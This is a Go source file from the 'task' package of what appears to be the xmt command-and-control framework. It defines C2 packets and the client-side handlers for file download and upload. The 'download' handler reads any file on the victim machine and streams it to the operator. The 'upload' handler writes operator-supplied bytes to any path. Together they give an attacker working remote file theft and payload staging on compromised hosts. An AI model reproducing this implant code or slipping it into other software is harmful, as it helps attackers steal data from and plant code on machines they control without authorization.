package task

import (
	"context"
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

// Download will instruct the client to read the (client local) filepath provided
// and return the raw binary data.
//
// The source path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvDownload
//
//  Input:
//      - string (src)
//  Output:
//      - string (expanded path)
//      - bool (is dir)
//      - int64 (file size)
//      - bytes..... (file data)
func Download(src string) *com.Packet {
	n := &com.Packet{ID: TvDownload}
	n.WriteString(src)
	return n
}

// Upload will instruct the client to write the provided byte array to the
// filepath provided. The client will return the number of bytes written and
// the resulting file path.
//
// The destination path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      - string (dts)
//      - bytes..... (file data)
//  Output:
//      - string (expanded path)
//      - int64 (file size written)
func Upload(dst string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	n.Write(b)
	return n
}

// UploadFile will instruct the client to write the provided (server local) file
// content to the filepath provided. The client will return the number of bytes
// written and the resulting file path.
//
// The destination path may contain environment variables that will be resolved during
// runtime.
//
// The source path may contain environment variables that will be resolved on
// server execution.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      - string (dts)
//      - bytes..... (file data)
//  Output:
//      - string (expanded path)
//      - int64 (file size written)
func UploadFile(dst, src string) (*com.Packet, error) {
	f, err := os.OpenFile(device.Expand(src), os.O_RDONLY, 0)
	if err != nil {
		return nil, err
	}
	n, err := UploadReader(dst, f)
	f.Close()
	return n, err
}

// UploadReader will instruct the client to write the provided reader content
// to the filepath provided. The client will return the number of bytes written
// and the resulting file path.
//
// The destination path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      - string (dts)
//      - bytes..... (file data)
//  Output:
//      - string (expanded path)
//      - int64 (file size written)
func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	_, err := io.Copy(n, r)
	return n, err
}
func upload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		f *os.File
	)
	if f, err = os.OpenFile(v, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644); err != nil {
		return err
	}
	n := data.NewCtxReader(x, r)
	c, err := io.Copy(f, n)
	n.Close()
	f.Close()
	w.WriteString(v)
	w.WriteInt64(c)
	return err
}
func download(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		i os.FileInfo
	)
	if i, err = os.Stat(v); err != nil {
		return err
	}
	if w.WriteString(v); i.IsDir() {
		w.WriteBool(true)
		w.WriteInt64(0)
		return nil
	}
	w.WriteBool(false)
	w.WriteInt64(i.Size())
	f, err := os.OpenFile(v, os.O_RDONLY, 0)
	if err != nil {
		return err
	}
	n := data.NewCtxReader(x, f)
	_, err = io.Copy(w, n)
	n.Close()
	return err
}
